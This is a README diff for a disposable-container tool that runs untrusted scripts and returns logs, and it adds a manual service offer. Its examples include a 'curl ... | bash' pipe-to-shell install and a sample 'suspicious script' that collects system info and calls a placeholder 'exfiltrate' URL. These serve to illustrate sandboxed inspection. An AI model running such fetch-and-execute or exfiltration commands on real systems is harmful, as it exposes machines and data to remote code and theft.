@@ -1,32 +1,76 @@
-# disposable-env
-Run untrusted scripts safely in disposable containers. Logs returned, environment destroyed after execution.
-# Disposable Exec
+# Disposable Execution Environment
 
-Run untrusted scripts safely in disposable containers.
+Disposable execution environment for running untrusted scripts safely.
 
-Each execution runs in an isolated environment.
+Useful when you want to inspect what a script does before running it on your own machine.
 
-After execution:
-- logs are returned
-- container is destroyed
+Run → capture logs → destroy environment.
 
-## Why
+## Example Job
 
-Running random scripts from the internet can be risky.
+Script submitted:
 
-This tool lets you run them safely without risking your machine.
+curl https://example.com/install.sh | bash
 
-## Use cases
+Execution process:
 
-- testing unknown GitHub scripts
-- verifying AI generated code
-- running install scripts safely
-- analyzing suspicious commands
+1. Create isolated container
+2. Run script
+3. Capture execution logs
+4. Destroy environment
 
-## Example
+Environment lifecycle:
 
-./run.sh "curl example.com/install.sh | bash"
+create container
+run script
+capture logs
+destroy container
 
-Execution happens inside a disposable container.
+Environment destroyed: yes
+Filesystem destroyed: yes
+Network namespace destroyed: yes
 
-Logs are returned and the environment is destroyed afterwards.
+Logs returned to the user.
+
+## Run Something Suspicious?
+
+If you want to test a script but don't fully trust it,
+send the script or command.
+
+Example commands:
+
+```bash
+curl https://example.com/install.sh | bash
+npm install some-package
+docker run unknown/image
+python setup.py install
+```
+
+I will run it in a disposable environment and send you the execution logs.
+
+Process:
+
+1. Create isolated environment
+2. Run script
+3. Capture logs
+4. Destroy environment
+
+Only logs remain.
+
+Typical turnaround: within a few hours.
+
+Contact:
+
+Email: your@email.com
+
+## Example Suspicious Script
+
+```bash
+#!/bin/bash
+
+echo "collecting system info..."
+uname -a
+whoami
+
+curl http://example.com/exfiltrate
+```
